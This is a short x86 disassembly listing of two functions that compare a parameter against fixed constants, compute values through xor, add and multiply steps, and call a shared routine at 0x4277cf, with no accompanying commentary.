  4278e3:	mov    ecx,DWORD PTR [esp+0x14]
  4278e7:	xor    eax,edi
  4278e9:	add    eax,esi
  4278eb:	imul   eax,DWORD PTR [esp+0x1c]
  4278f0:	mov    DWORD PTR [ecx],eax
  4278f2:	jmp    0x42793b
  4278f4:	mov    ecx,DWORD PTR [ebp+0x20]
  4278f7:	cmp    ecx,0xf89c85a1
  4278fd:	jne    0x427906
  4278ff:	push   0xf89c85a0
  427904:	jmp    0x427924
  427906:	mov    ecx,DWORD PTR [ebp+0x20]
  427909:	cmp    ecx,0xf89c85a0
  42790f:	jne    0x427918
  427911:	push   0xf89c85bf
  427916:	jmp    0x427924
  427918:	mov    ecx,DWORD PTR [ebp+0x20]
  42791b:	cmp    ecx,0xf89c85bf
  427921:	jne    0x42793b
  427923:	push   eax
  427924:	push   DWORD PTR [ebp+0x1c]
  427927:	push   DWORD PTR [ebp+0x18]
  42792a:	push   ebx
  42792b:	push   DWORD PTR [ebp+0x10]
  42792e:	push   DWORD PTR [ebp+0xc]
  427931:	push   DWORD PTR [ebp+0x8]
  427934:	call   0x4277cf
  427939:	mov    DWORD PTR [ebx],eax
  42793b:	mov    eax,DWORD PTR [ebx]
  42793d:	pop    edi
  42793e:	pop    esi
  42793f:	pop    ebx
  427940:	mov    esp,ebp
  427942:	pop    ebp
  427943:	ret    0x1c
  427946:	push   ebp
  427947:	mov    ebp,esp
  427949:	sub    esp,0xc
  42794c:	mov    eax,0xf89c85a5
  427951:	mov    DWORD PTR [ebp-0x8],eax
  427954:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  42795b:	mov    ecx,DWORD PTR [ebp-0x8]
  42795e:	xor    ecx,0x75108af
  427964:	add    ecx,0x3272f6
  42796a:	mov    DWORD PTR [ebp-0x4],ecx
  42796d:	mov    ecx,DWORD PTR [ebp+0xc]
  427970:	push   eax
  427971:	mov    DWORD PTR [ebp+0xc],ecx
  427974:	push   DWORD PTR [ebp+0xc]
  427977:	lea    eax,[ebp-0x4]
  42797a:	push   DWORD PTR [ebp+0x8]
  42797d:	push   eax
  42797e:	push   DWORD PTR [ebp+0xc]
  427981:	push   DWORD PTR [ebp-0xc]
  427984:	push   DWORD PTR [ebp-0x8]
  427987:	call   0x4277cf
  42798c:	mov    DWORD PTR [ebp-0x4],eax
  42798f:	mov    eax,DWORD PTR [ebp-0x4]
  427992:	leave  
  427993:	ret    0x8
